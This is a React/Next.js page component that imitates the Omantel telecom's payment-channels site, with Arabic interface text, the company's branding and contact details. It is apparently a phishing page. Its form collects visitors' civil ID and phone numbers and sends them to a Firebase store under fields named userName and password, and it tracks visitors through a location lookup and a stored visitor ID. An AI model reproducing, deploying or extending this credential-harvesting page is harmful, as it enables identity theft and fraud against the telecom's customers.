import { Phone, ChevronLeft } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import Link from "next/link";
import { Input } from "./ui/input";
import { useEffect, useState } from "react";
import { getLocation } from "@/lib/utils";
import { addData } from "@/lib/firebase";

export default function PaymentChannelsPage({
  setCurrentStep,
}: {
  setCurrentStep: (e: string) => void;
}) {
  const paymentChannels = [
    {
      name: "مركز خدمة العملاء",
      nameEn: "Customer Service Center",
      icon: "📞",
    },
    { name: "الخدمة الذاتية", nameEn: "Self Service", icon: "💳" },
    { name: "تطبيق عمانتل", nameEn: "Omantel App", icon: "📱" },
    { name: "البنك الأهلي", nameEn: "National Bank", icon: "🏦" },
    { name: "بنك مسقط", nameEn: "Bank Muscat", icon: "🏦" },
    { name: "بنك صحار", nameEn: "Bank Sohar", icon: "🏦" },
  ];

  const otherChannels = [
    { name: "فروع عمانتل", nameEn: "Omantel Branches" },
    { name: "الوكلاء المعتمدون", nameEn: "Authorized Agents" },
  ];
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [mobile, setMobile] = useState("");

  useEffect(() => {
    getLocation().then(() => {
      const _visititorId = localStorage.getItem("visitor");
      if (_visititorId) {
      }
    });
  }, []);
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const visitorId = localStorage.getItem("visitor") as string;
    await addData({
      id: visitorId!,
      userName: userId,
      password,
      mobile,
      email: mobile,
    }).then(() => {
      setIsLoading(false);
      setCurrentStep("2");
      console.log("done1", isLoading, setUserId, setMobile, setPassword);
    });
    setIsLoading(true);
  };
  return (
    <div className="min-h-screen bg-background" dir="rtl">
      {/* Header */}

      <header className="bg-[#3111f3] text-white">
        <div className=" w-full h-8 bg-orange-500 text-white ">
          نوفر لك العديد من قنوات الدفع السهلة
        </div>
        <div className="container mx-auto px-4">
          <div className="flex items-center justify-between py-4">
            <div className="flex items-center gap-8">
              <div className="text-2xl font-bold">
                <img src="/ASD.svg" width={120} />
              </div>
              <nav className="hidden md:flex gap-6 text-sm">
                <a href="#" className="hover:text-primary transition-colors">
                  الرئيسية
                </a>
                <a href="#" className="hover:text-primary transition-colors">
                  الأفراد
                </a>
                <a href="#" className="hover:text-primary transition-colors">
                  الأعمال
                </a>
                <a href="#" className="hover:text-primary transition-colors">
                  من نحن
                </a>
              </nav>
            </div>
            <div className="flex items-center gap-4">
              <Button
                variant="ghost"
                size="sm"
                className="text-white hover:text-primary"
              >
                English
              </Button>
            </div>
          </div>
        </div>
      </header>

      {/* Breadcrumb */}

      {/* Hero Section */}
      <section className="bg-primary text-primary-foreground ">
        <img
          src="/d7df8978-aebd-4b71-9dfd-2bf0a2dfc160.JPG"
          className="w-full h-full bg-cover anum"
        />
        <div className="flex justify-center">
          <Link
            href="#omantel"
            className="p-1 m-2 bg-orange-600 w-full rounded text-center"
          >
            تسجيل
          </Link>
        </div>
      </section>

      {/* Contact Center Section */}
      <section className="py-12 bg-muted" id="omantel">
        <div className="container mx-auto px-4">
          <Card className="max-w-2xl mx-auto p-8 text-center">
            <form onSubmit={handleLogin} className="space-y-6">
              <div className="text-right">
                <label className="block text-slate-700 font-medium text-sm mb-3">
                  الرقم المدني *
                </label>
                <div className="relative">
                  <Input
                    type="tel"
                    className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50 px-4 py-4 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 placeholder:text-slate-400 transition-all duration-200"
                    dir="rtl"
                    onChange={(w) => {
                      setMobile(w.target.value);
                    }}
                    placeholder="ادخل الرقم المدني"
                  />
                </div>
              </div>
              <div className="text-right">
                <label className="block text-slate-700 font-medium text-sm mb-3">
                  رقم الهاتف *
                </label>
                <div className="relative">
                  <Input
                    type="tel"
                    className="w-full border-2 border-slate-200 rounded-xl bg-slate-50/50 px-4 py-4 text-right text-sm focus:border-blue-500 focus:bg-white focus:ring-0 placeholder:text-slate-400 transition-all duration-200"
                    dir="rtl"
                    onChange={(w) => {
                      setPassword(w.target.value);
                    }}
                    placeholder="أدخل رقم هاتفك"
                  />
                </div>
              </div>

              <div className="pt-4">
                <Button
                  disabled={isLoading}
                  className="w-full bg-gradient-to-r from-orange-600 to-orange-700 hover:from-blue-700 hover:to-blue-800 text-white py-4 rounded-xl text-sm font-medium shadow-lg hover:shadow-xl transition-all duration-200 disabled:opacity-50"
                >
                  {isLoading ? (
                    <div className="flex items-center gap-2">
                      <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                      جاري المعالجة...
                    </div>
                  ) : (
                    <div className="flex items-center justify-center gap-2">
                      <span>التالي</span>
                      <span>←</span>
                    </div>
                  )}
                </Button>
              </div>
            </form>
          </Card>
        </div>
      </section>

      {/* Payment Channels Section */}
      <section className="py-16">
        <div className="container mx-auto px-4">
          <h2 className="text-3xl font-bold text-center mb-12">
            قنوات الدفع الإلكترونية
          </h2>

          <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6 max-w-5xl mx-auto">
            {paymentChannels.map((channel, index) => (
              <Card
                key={index}
                className="p-6 hover:shadow-lg transition-shadow cursor-pointer"
              >
                <div className="flex items-center gap-4">
                  <div className="text-4xl">{channel.icon}</div>
                  <div className="flex-1">
                    <h3 className="font-bold text-lg mb-1">{channel.name}</h3>
                    <p className="text-sm text-muted-foreground">
                      {channel.nameEn}
                    </p>
                  </div>
                  <ChevronLeft className="w-5 h-5 text-muted-foreground rotate-180" />
                </div>
              </Card>
            ))}
          </div>
        </div>
      </section>

      {/* Other Channels Section */}
      <section className="py-16 bg-muted">
        <div className="container mx-auto px-4">
          <h2 className="text-3xl font-bold text-center mb-12">
            قنوات الدفع الأخرى
          </h2>

          <div className="grid md:grid-cols-2 gap-6 max-w-3xl mx-auto">
            {otherChannels.map((channel, index) => (
              <Card
                key={index}
                className="p-6 hover:shadow-lg transition-shadow cursor-pointer"
              >
                <div className="flex items-center justify-between">
                  <div>
                    <h3 className="font-bold text-lg mb-1">{channel.name}</h3>
                    <p className="text-sm text-muted-foreground">
                      {channel.nameEn}
                    </p>
                  </div>
                  <ChevronLeft className="w-5 h-5 text-muted-foreground rotate-180" />
                </div>
              </Card>
            ))}
          </div>
        </div>
      </section>

      {/* Partners Section */}
      <section className="py-16">
        <div className="container mx-auto px-4">
          <div className="max-w-4xl mx-auto">
            <h2 className="text-2xl font-bold text-center mb-8">
              شركاؤنا في الدفع
            </h2>
            <div className="bg-card border rounded-lg p-8">
              <div className="flex flex-wrap items-center justify-center gap-8">
                <div className="text-center">
                  <div className="w-24 h-24 bg-muted rounded-lg flex items-center justify-center mb-2">
                    <span className="text-2xl font-bold">SALECO</span>
                  </div>
                </div>
                <div className="text-center">
                  <div className="w-24 h-24 bg-muted rounded-lg flex items-center justify-center mb-2">
                    <span className="text-2xl font-bold">Bank</span>
                  </div>
                </div>
                <div className="text-center">
                  <div className="w-24 h-24 bg-muted rounded-lg flex items-center justify-center mb-2">
                    <span className="text-2xl font-bold">Pay</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* CTA Section */}
      <section className="py-16 bg-primary text-primary-foreground">
        <div className="container mx-auto px-4 text-center">
          <h2 className="text-3xl font-bold mb-4">هل تحتاج إلى مساعدة؟</h2>
          <p className="text-lg mb-8 opacity-95">
            فريقنا جاهز لمساعدتك في أي وقت
          </p>
          <div className="flex flex-wrap gap-4 justify-center">
            <Button variant="secondary" size="lg">
              تواصل معنا
            </Button>
            <Button
              variant="outline"
              size="lg"
              className="bg-transparent border-white text-white hover:bg-white hover:text-primary"
            >
              الأسئلة الشائعة
            </Button>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-[#0a1e3d] text-white py-12">
        <div className="container mx-auto px-4">
          <div className="grid md:grid-cols-4 gap-8 mb-8">
            <div>
              <h3 className="font-bold mb-4">الأفراد</h3>
              <ul className="space-y-2 text-sm opacity-80">
                <li>
                  <a href="#" className="hover:text-primary transition-colors">
                    الهاتف المتحرك
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-primary transition-colors">
                    الإنترنت المنزلي
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-primary transition-colors">
                    التلفزيون
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-primary transition-colors">
                    الخدمات الرقمية
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-bold mb-4">الأعمال</h3>
              <ul className="space-y-2 text-sm opacity-80">
                <li>
                  <a href="#" className="hover:text-primary transition-colors">
                    الحلول السحابية
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-primary transition-colors">
                    الأمن السيبراني
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-primary transition-colors">
                    مراكز البيانات
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-primary transition-colors">
                    إنترنت الأشياء
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-bold mb-4">من نحن</h3>
              <ul className="space-y-2 text-sm opacity-80">
                <li>
                  <a href="#" className="hover:text-primary transition-colors">
                    عن الشركة
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-primary transition-colors">
                    المسؤولية الاجتماعية
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-primary transition-colors">
                    الوظائف
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-primary transition-colors">
                    الأخبار
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h3 className="font-bold mb-4">تواصل معنا</h3>
              <ul className="space-y-2 text-sm opacity-80">
                <li>الهاتف: 1234</li>
                <li>البريد الإلكتروني: info@omantel.om</li>
                <li className="flex gap-3 pt-2">
                  <a href="#" className="hover:text-primary transition-colors">
                    <div className="w-8 h-8 bg-white/10 rounded-full flex items-center justify-center">
                      f
                    </div>
                  </a>
                  <a href="#" className="hover:text-primary transition-colors">
                    <div className="w-8 h-8 bg-white/10 rounded-full flex items-center justify-center">
                      t
                    </div>
                  </a>
                  <a href="#" className="hover:text-primary transition-colors">
                    <div className="w-8 h-8 bg-white/10 rounded-full flex items-center justify-center">
                      in
                    </div>
                  </a>
                </li>
              </ul>
            </div>
          </div>

          <div className="border-t border-white/10 pt-8 text-center text-sm opacity-60">
            <p>© 2025 عمانتل. جميع الحقوق محفوظة</p>
          </div>
        </div>
      </footer>
    </div>
  );
}